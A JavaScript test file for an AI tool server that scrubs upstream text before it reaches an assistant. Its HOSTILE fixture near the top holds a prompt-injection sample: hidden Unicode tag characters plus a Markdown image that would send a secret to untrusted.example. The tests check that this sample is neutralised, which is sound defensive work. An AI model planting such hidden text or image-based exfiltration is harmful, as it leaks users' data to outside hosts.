// What reaches the assistant from upstream: invisible characters and remote images are removed from results,
// odd response shapes never crash or print "[object Object]", and the API can tell which release is calling.
import { test } from "node:test";
import assert from "node:assert/strict";
import { createRequire } from "node:module";
import { createHandlers } from "../lib/tools.js";
import { scrubUpstream, UNTRUSTED_NOTICE } from "../lib/own-data.js";
import { stubApi, KEY_A } from "./helpers.js";
import * as F from "./fixtures.js";

const h = () => createHandlers(KEY_A);
const TAGS = String.fromCodePoint(0xe0049, 0xe0067, 0xe006e); // Unicode tag characters: invisible to a reader
const HOSTILE = `Strong team.${TAGS}\u202e\u200b\u0007 ![x](https://untrusted.example/p.png?d=secret) Next line\nstays.`;

test("scrubUpstream removes invisible characters, keeps tabs and newlines, and breaks Markdown images", () => {
  const out = scrubUpstream(HOSTILE);
  assert.equal(out, "Strong team. !\\[x](https://untrusted.example/p.png?d=secret) Next line\nstays.");
  assert.equal(scrubUpstream("a\tb\nc"), "a\tb\nc");
  assert.equal(scrubUpstream(null), "");
});

test("scrubUpstream keeps the joiners that emoji, Persian and Indic text need", () => {
  // An emoji family (zero-width joiner), a Persian word (zero-width non-joiner) and an Indic conjunct (joiner).
  for (const kept of ["\u{1f468}\u200d\u{1f469}\u200d\u{1f467}", "\u0645\u06cc\u200c\u062e\u0648\u0627\u0647\u0645", "\u0915\u094d\u200d\u0937"]) {
    assert.equal(scrubUpstream(kept), kept);
  }
});

test("a tool result built from upstream text is scrubbed after the data notice", async () => {
  const api = stubApi(() => ({ success: true, data: { analysis: HOSTILE } }));
  try {
    const out = await h().nuvc_analyze({ text: "A pitch with enough detail for feedback" });
    assert.ok(out.startsWith(UNTRUSTED_NOTICE + "\n\n"), out.slice(0, 80));
    assert.ok(!/[\u0007\u200b\u200e\u200f\u202a-\u202e\u{e0000}-\u{e007f}]/u.test(out), "no invisible characters survive");
    assert.ok(!out.includes("![x]"), "no renderable image survives");
    assert.ok(out.includes("Strong team."), "the readable text is kept");
  } finally {
    api.restore();
  }
});

test("a decision or verdict that is not text is left out, never thrown on or printed as an object", async () => {
  let api = stubApi(() => ({ success: true, data: { overall_score: 7.4, fit: { conviction_score: 64, decision: { label: "watch" } } } }));
  try {
    const out = await h().nuvc_score({ text: "A fintech for SMEs with traction" });
    assert.ok(!out.includes("[object Object]"), out);
    assert.match(out, /ConvictionScore: 6\.4 \/ 10\*\*$/m);
    assert.ok(!out.includes("Decision: ****"), out);
  } finally {
    api.restore();
  }
  api = stubApi(() => ({ success: true, data: { fund_name: "Fund IV", screening_score: 6.1, decision: { a: 1 }, verdict: ["x"], dimensions: {} } }));
  try {
    const out = await h().nuvc_screen_fund({ fund_name: "Fund IV" });
    assert.match(out, /Screen: 6\.1 \/ 10/);
    assert.ok(!out.includes("[object Object]") && !out.includes("**Decision:**"), out);
  } finally {
    api.restore();
  }
});

test("the User-Agent names the exact package version", async () => {
  const { version } = createRequire(import.meta.url)("../package.json");
  const realFetch = globalThis.fetch;
  let seen;
  globalThis.fetch = async (_url, init = {}) => {
    seen = init.headers?.["User-Agent"];
    return new Response(JSON.stringify({ success: true, data: { models: [] } }), { status: 200, headers: { "Content-Type": "application/json" } });
  };
  try {
    await h().nuvc_models({});
  } finally {
    globalThis.fetch = realFetch;
  }
  assert.equal(seen, `nuvc-mcp/${version}`);
});

test("the status tool reports availability and nothing about what sits behind the API", async () => {
  // The stub carries provider names, a fallback order, model identifiers and an equivalence map; none may be shown.
  let api = stubApi(() => F.MODELS);
  try {
    const out = await h().nuvc_models({});
    assert.equal(out, "## NUVC service status\n\nScoring service: Available.");
    assert.doesNotMatch(out, /provider-|embedding|model-|\u2192|Preference/i);
  } finally {
    api.restore();
  }
  api = stubApi(() => ({ success: true, data: { providers: [{ name: "provider-a", available: true, healthy: false }], preference: ["provider-a"] } }));
  try {
    const out = await h().nuvc_models({});
    assert.match(out, /Scoring service: Unavailable right now/);
    assert.ok(!out.includes("provider-a"), out);
  } finally {
    api.restore();
  }
  api = stubApi(() => ({ success: true, data: {} }));
  try {
    assert.match(await h().nuvc_models({}), /Status was not reported/);
  } finally {
    api.restore();
  }
});

test("a match result shows the shortlist, not how it was computed or how long it took", async () => {
  const api = stubApi(() => F.MATCH);
  try {
    const out = await h().nuvc_match_investors({ text: "A fintech for SMEs with traction" });
    assert.match(out, /matched from the NUVC investor database\n/);
    assert.doesNotMatch(out, /semantic|keyword matching|\d+ ?ms\b|latency/i);
  } finally {
    api.restore();
  }
});

test("no tool description names a provider, a model or how matching is computed, and examples use made-up names", async () => {
  const { getTools } = await import("../lib/tools.js");
  const text = JSON.stringify(getTools());
  assert.doesNotMatch(text, /openai|anthropic|gemini|gpt-|embedding|semantic matching|provider health/i);
  assert.match(text, /Example Capital Fund IV/);
});

test("an analysis or extraction body in an unexpected shape is never printed as-is", async () => {
  const odd = { success: true, data: { usage: { model: "model-1", latency_ms: 900 }, note: "internal" } };
  let api = stubApi(() => odd);
  try {
    const out = await h().nuvc_analyze({ text: "A pitch with enough detail for feedback" });
    assert.match(out, /No analysis was returned; try again\./);
    assert.doesNotMatch(out, /model-1|latency|internal|usage/);
  } finally {
    api.restore();
  }
  api = stubApi(() => odd);
  try {
    const out = await h().nuvc_extract({ text: "A pitch with enough detail for feedback" });
    assert.match(out, /No fields were returned; try again\./);
    assert.doesNotMatch(out, /model-1|latency|internal|usage/i);
  } finally {
    api.restore();
  }
});
